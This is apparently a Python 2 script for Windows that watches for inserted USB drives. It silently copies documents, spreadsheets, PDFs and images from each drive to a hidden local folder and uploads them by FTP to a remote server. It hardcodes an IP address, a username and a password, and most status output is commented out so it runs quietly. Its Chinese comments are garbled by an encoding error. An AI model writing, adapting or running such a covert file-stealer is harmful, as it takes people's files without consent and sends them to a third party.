#coding=utf-8
'''
Created on 2016��6��9��

@author: pangb
'''

import os
import time 
import shutil
import string
import win32file  
import traceback
from ftplib import FTP  
import sys, getpass, os.path  

def getdrives():  
    drives=[]  
    sign=win32file.GetLogicalDrives()  
    drive_all=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\",  
                "J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",  
                "S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]  
    for i in range(25):  
        if (sign&1<<i):  
            if win32file.GetDriveType(drive_all[i])==2:  
                drives.append(drive_all[i])  
    return drives  
  
def is_UDisk(drives):  
    UDisk=[]  
    for item in drives:  
        try :  
            free_bytes,total_bytes,total_free_bytes=win32file.GetDiskFreeSpaceEx(item)  
            if (total_bytes/1024/1024/1024)<17:  
                UDisk.append(item)  
        except :  
            break  
    return UDisk  

USB = 'G:\\'  #u��Ŀ¼
SAVE = 'D:\\usbcopy\\'  #����Ŀ¼
#ע���Ŀ¼���ϼ�Ŀ¼�������
OLD=[]
host = "211.87.234.232"
username = "team"
password = "team123"
remotefile = "~/master"

# �ļ�����
word="txt,doc,docx,ppt,pptx,cpp,xls,pdf,ms10,pdf,jpg,\
jpeg,png,gif,TXT,DOC,DOCX,PPT,PPTX,CPP,XLS,PDF,MS10,\
PDF,JPG,JPEG,PNG,GIF".split(",")[:-1]

#�ж��ļ��Ƿ���Ҫ����
def value(file):
    if os.path.isfile(file)==False:
        return 0
    for i in word:
        if string.find(file,i)>-1:
            return 1
    return 0
#�����ļ�
def copyfile(file,filename):
    #print SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+filename
    shutil.copy(file,SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+"#"+filename)

def upload():
    host = 'xxx.xxx.xxx.xxx'
    username = 'name'
    password = 'password'
    remotepath = '/master'
    f = FTP(host)
    print 'connect'
    f.login(username, password)
    print 'connect success'
    f.cwd(remotepath)
    for root, dirs, files in os.walk(USB): 
        for file in files:
            export = os.path.join(root,file)
            try :
                if value(export):
                    #print "����#"+export
                    #copyfile(export,file)
                    fd = open(export)
                    f.set_pasv(0)
                    f.storbinary('STOR '+ file, fd, 1024)
                    fd.close()
                    
            except: 
                 print("����")
                 traceback.print_exc()
    f.quit
    return 
    
#U�̱���
def usbWalker():
    if not os.path.exists(SAVE): 
        os.mkdir(SAVE)
    #print "��ʼץȡU��"
    f=open(SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+".txt","w")
    for root, dirs, files in os.walk(USB): 
        for file in files:
            export = os.path.join(root,file)
            f.writelines(export+'\n')
            try :
                if value(export):
                    #print "����#"+export
                    copyfile(export,file)
            except: 
                 print("����")
    f.close
    #print "�����ļ����"
            
#���ж�U�������Ƿ�仯
def getusb():
    global OLD
    NEW=os.listdir(USB)
    if (len(NEW)==len(OLD)):
        #print "U������û�б仯"
        return 0
    else:
        OLD=NEW
        return 1
#������������ļ������
if os.path.isfile("set.ini"):
    #print "��������"
    ff=open("set.ini","r")
    USB=ff.readline()[:-1]
    SAVE=ff.readline()[:-1]
    word=ff.readline().split(",")[:-1]
    #print USB,SAVE,word
        
while(1):
    #if os.path.exists(USB):
    devices = getdrives()
    if len(devices) > 0:
        #print devices
        #print "��⵽U��"
        USB=devices[0]
        if getusb():
            try :
                usbWalker()
                upload()
            except:
                print "δ֪����"
            print 'done'
            sys.exit()
    #print "��ʼ����"
    
    time.sleep(10) #����ʱ��
    #print "���߽���"